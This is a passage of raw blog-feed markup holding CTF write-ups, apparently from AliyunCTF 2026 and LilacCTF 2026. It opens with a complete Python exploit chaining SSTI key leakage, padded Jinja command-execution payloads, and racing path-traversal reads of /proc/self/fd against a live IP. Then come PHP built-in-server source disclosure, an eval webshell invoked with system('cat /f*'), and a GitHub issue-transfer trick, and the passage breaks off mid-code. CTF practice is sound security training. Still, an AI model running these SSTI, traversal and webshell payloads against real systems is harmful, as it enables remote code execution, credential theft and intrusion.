class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">import</span> os<span class="token comment"># BASE_URL = "http://127.0.0.1:25000"</span>BASE_URL <span class="token operator">=</span> <span class="token string">"http://223.6.249.127:11350"</span><span class="token keyword">def</span> <span class="token function">leak_api_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Leaking API_KEY..."</span><span class="token punctuation">)</span>    boundary <span class="token operator">=</span> <span class="token string">"a"</span>    payload <span class="token operator">=</span> <span class="token punctuation">(</span>        <span class="token string-interpolation"><span class="token string">f"&#123;&#123;0.view_functions[admin].__globals__[API_KEY]&#125;&#125;\r\n"</span></span>        <span class="token string-interpolation"><span class="token string">f"--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>boundary<span class="token punctuation">&#125;</span></span><span class="token string">\r\n"</span></span>        <span class="token string-interpolation"><span class="token string">f'Content-Disposition: form-data; name="action"; filename="a.json"\r\n'</span></span>        <span class="token string-interpolation"><span class="token string">f"Content-Type: application/json\r\n\r\n"</span></span>        <span class="token string-interpolation"><span class="token string">f'&#123;&#123;"type": "debug"&#125;&#125;\r\n'</span></span>        <span class="token string-interpolation"><span class="token string">f"--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>boundary<span class="token punctuation">&#125;</span></span><span class="token string">--\r\n"</span></span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">300</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Payload too long"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/heartbeat"</span></span><span class="token punctuation">,</span>                          data<span class="token operator">=</span><span class="token punctuation">&#123;</span>                              <span class="token string">"text"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>                              <span class="token string">"client"</span><span class="token punctuation">:</span> <span class="token string">"Content-Type"</span><span class="token punctuation">,</span>                              <span class="token string">"token"</span><span class="token punctuation">:</span>                              <span class="token string-interpolation"><span class="token string">f"multipart/form-data; boundary=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>boundary<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                          timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Leak request failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token comment"># Retry once</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/heartbeat"</span></span><span class="token punctuation">,</span>                              data<span class="token operator">=</span><span class="token punctuation">&#123;</span>                                  <span class="token string">"text"</span><span class="token punctuation">:</span>                                  payload<span class="token punctuation">,</span>                                  <span class="token string">"client"</span><span class="token punctuation">:</span>                                  <span class="token string">"Content-Type"</span><span class="token punctuation">,</span>                                  <span class="token string">"token"</span><span class="token punctuation">:</span>                                  <span class="token string-interpolation"><span class="token string">f"multipart/form-data; boundary=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>boundary<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                              timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Leak failed: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token comment"># print(r.text)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'([a-f0-9]&#123;64&#125;)'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] API Key not found"</span><span class="token punctuation">)</span>    <span class="token comment"># sys.exit(1)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span>  <span class="token comment"># For testing without key if needed</span><span class="token keyword">def</span> <span class="token function">upload_thread</span><span class="token punctuation">(</span>stop_event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Continuously upload large files to /heartbeat.</span>    <span class="token comment"># The 'text' param is kept short to pass validation.</span>    <span class="token comment"># We add a 'dummy' file field that is large enough to force Werkzeug to write to disk.</span>    <span class="token comment"># Payload designed to execute command and reveal flag filename</span>    ssti_payload <span class="token operator">=</span> <span class="token string">"&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls /').read()&#125;&#125;"</span>    <span class="token comment"># Pad payload to ~1MB to ensure temporary file creation</span>    padding <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 2MB</span>    full_content <span class="token operator">=</span> ssti_payload <span class="token operator">+</span> padding    <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment"># We use a file upload for the padding</span>            files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'padding'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'p.txt'</span><span class="token punctuation">,</span> full_content<span class="token punctuation">,</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>            <span class="token comment"># 'text' must be provided and short</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'text'</span><span class="token punctuation">:</span> <span class="token string">'keepalive'</span><span class="token punctuation">&#125;</span>            <span class="token comment"># This request will take some time to upload and process</span>            requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/heartbeat"</span></span><span class="token punctuation">,</span>                          data<span class="token operator">=</span>data<span class="token punctuation">,</span>                          files<span class="token operator">=</span>files<span class="token punctuation">,</span>                          timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            <span class="token comment"># Ignore timeouts or errors, we just want to spam uploads</span>            <span class="token keyword">pass</span>        <span class="token comment"># time.sleep(0.01)</span><span class="token keyword">def</span> <span class="token function">read_thread</span><span class="token punctuation">(</span>api_key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> fd_range<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Authorization"</span><span class="token punctuation">:</span> api_key<span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> fd <span class="token keyword">in</span> fd_range<span class="token punctuation">:</span>            <span class="token keyword">if</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">break</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token comment"># Include /proc/self/fd/X</span>                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>                    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin"</span></span><span class="token punctuation">,</span>                    params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"tmpl"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"../../../../proc/self/fd/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>fd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>                    timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                    text <span class="token operator">=</span> r<span class="token punctuation">.</span>text                    <span class="token comment"># Check for execution evidence (e.g., 'bin', 'etc', 'flag-')</span>                    <span class="token keyword">if</span> <span class="token string">"bin"</span> <span class="token keyword">in</span> text <span class="token keyword">and</span> <span class="token string">"etc"</span> <span class="token keyword">in</span> text <span class="token keyword">and</span> <span class="token string">"flag-"</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[+] HIT! Found flag info in fd </span><span class="token interpolation"><span class="token punctuation">&#123;</span>fd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                        <span class="token comment"># Extract flag filename from ls output</span>                        m <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(flag-[a-f0-9]+\.txt)'</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>                        <span class="token keyword">if</span> m<span class="token punctuation">:</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Flag Filename: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                            stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token comment"># Read the actual flag</span>                            flag_r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>                                <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/admin"</span></span><span class="token punctuation">,</span>                                params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"tmpl"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"../../../../</span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                                headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] FLAG CONTENT: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag_r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                            <span class="token keyword">return</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> leak_api_key<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> key<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Could not leak key, exiting."</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] API_KEY: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    stop_event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Start uploader threads to keep temp files on disk</span>    uploaders <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 4 upload threads</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>upload_thread<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>stop_event<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        uploaders<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token comment"># Start reader threads to scan FDs</span>    readers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment"># Scan FDs 3 to 30 (Docker/Linux usually assigns low FDs)</span>    <span class="token comment"># Split execution across threads</span>    <span class="token comment"># Thread 1: 3-10</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_thread<span class="token punctuation">,</span>                          args<span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># Thread 2: 11-20</span>    t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_thread<span class="token punctuation">,</span>                          args<span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># Thread 3: 21-30</span>    t3 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_thread<span class="token punctuation">,</span>                          args<span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># Thread 4: 7-8 (Focus on likely candidates strongly)</span>    t4 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>read_thread<span class="token punctuation">,</span>                          args<span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> stop_event<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    readers<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> t3<span class="token punctuation">,</span> t4<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> readers<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Race condition started. Press Ctrl+C to stop..."</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> stop_event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] Stopping..."</span><span class="token punctuation">)</span>        stop_event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> uploaders <span class="token operator">+</span> readers<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Done."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2026/01/31/AliyunCTF2026/IMG-20260201165254381.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/blog/2026/01/31/AliyunCTF2026/IMG-20260201220549354.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/news/91567&quot;&gt;https://xz.aliyun.com/news/91567&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/Xu8bmR0GWKhJX_NTHbdZtA&quot;&gt;https://mp.weixin.qq.com/s/Xu8bmR0GWKhJX_NTHbdZtA&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="MongoDB" scheme="http://c1oudfl0w0.github.io/blog/tags/MongoDB/"/>
    
    <category term="Rust" scheme="http://c1oudfl0w0.github.io/blog/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>LilacCTF 2026</title>
    <link href="http://c1oudfl0w0.github.io/blog/2026/01/24/LilacCTF-2026/"/>
    <id>http://c1oudfl0w0.github.io/blog/2026/01/24/LilacCTF-2026/</id>
    <published>2026-01-24T03:59:07.000Z</published>
    <updated>2026-02-05T03:52:51.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p><a href="https://blog.xmcve.com/2026/01/27/LilacCTF-2026-Writeup/">https://blog.xmcve.com/2026/01/27/LilacCTF-2026-Writeup/</a></p><p><a href="https://lilachit.notion.site/LilacCTF-2026-Official-WriteUp-2f44c775ef0e80ba8398f120cd4c59d1">https://lilachit.notion.site/LilacCTF-2026-Official-WriteUp-2f44c775ef0e80ba8398f120cd4c59d1</a></p><span id="more"></span><hr><h1 id="keep"><a href="#keep" class="headerlink" title="keep"></a>keep</h1><p>404æŠ¥é”™é¡µé¢ä¸€çœ¼ <code>php -S</code> èµ·çš„æœåŠ¡å™¨</p><p>php 7.3.4ï¼Œç›´æ¥æ‰“æºç æ³„éœ²</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/index.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">61.147.171.103:60623</span></span><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/1.txt</span> <span class="token http-version property">HTTP/1.1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿”å›</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello World!"</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token comment">// s3Cr37_f1L3.php.bak</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—® s3Cr37_f1L3.php.bak è¿”å›</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯å°è¯•è®¿é—® s3Cr37_f1L3.php å‘ç°ä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼ŒçŒœæµ‹æ˜¯è¦æŠŠ bak è§£æä¸º php</p><p>æ ¹æ®è‡ªå·±çš„æ—©æœŸ<a href="/blog/2023/05/22/PHP-7-4-21%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">æ–‡ç« </a>è®°è½½ï¼Œç¬¬äºŒä¸ªGETåçš„ <code>/</code> è¯·æ±‚çš„å¦‚æœæ˜¯ .php æˆ– .PHP åç¼€åˆ™ä¼šè§†ä¸º php æ–‡ä»¶è§£æ</p><p>è‡³äºå¦‚ä½•ä¼  POST å‚æ•°ï¼Œæµ‹è¯•å‘ç°åªè¦å¸¦ä¸Š CL å¤´ç®—æ¸…æ¥šè¯·æ±‚ä½“é•¿åº¦å³å¯</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/s3Cr37_f1L3.php.bak</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">61.147.171.103:60623</span></span><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/1.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">24</span></span>admin=system('cat+/f*');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ° flag</p><hr><h1 id="Your-GitHub-mine"><a href="#Your-GitHub-mine" class="headerlink" title="Your GitHub, mine"></a>Your GitHub, mine</h1><p>å…ˆè®¿é—® classroom é“¾æ¥åŠ å…¥ classroom ä»“åº“</p><p>ç„¶å nc botï¼Œé€‰æ‹© create issue</p><p>æ¥ä¸‹æ¥è¿›å…¥é‚£ä¸ª issueï¼Œç¼–è¾‘ issue æ­£æ–‡ï¼Œä¿®æ”¹ä¸º <code>@lilacctf-tech</code></p><p>æ”¹å˜ owner åˆ°è‡ªå·±ï¼Œä¿®æ”¹ä¸º publicï¼Œtransfer issue åˆ°è‡ªå·±çš„å…¬å¼€ä»“åº“</p><p>ç„¶å check issue</p><p><img src="/blog/2026/01/24/LilacCTF-2026/IMG-20260124131214345.png"></p><hr><h1 id="CheckInï¼ˆå¤ç°ï¼‰"><a href="#CheckInï¼ˆå¤ç°ï¼‰" class="headerlink" title="CheckInï¼ˆå¤ç°ï¼‰"></a>CheckInï¼ˆå¤ç°ï¼‰</h1><p>æ²¡ç»·ä½èƒ½æ‰«å‡º back.zipï¼Œé‚£æˆ‘é»‘ç›’å…¨æµ‹å®Œäº†ç®—ä»€ä¹ˆï¼ˆ</p><p>backup.zip</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Python 3.14.2</span><span class="token keyword">import</span> re<span class="token keyword">from</span> collections <span class="token keyword">import</span> UserList<span class="token keyword">from</span> sys <span class="token keyword">import</span> argv<span class="token keyword">class</span> <span class="token class-name">LockedList</span><span class="token punctuation">(</span>UserList<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__setitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Assignment blocked!"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">sandbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ERROR: Missing code"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        status <span class="token operator">=</span> LockedList<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        status_id <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span>        user_input <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'[0-9A-Z]'</span><span class="token punctuation">,</span> user_input<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FORBIDDEN: No numbers or alphas"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token 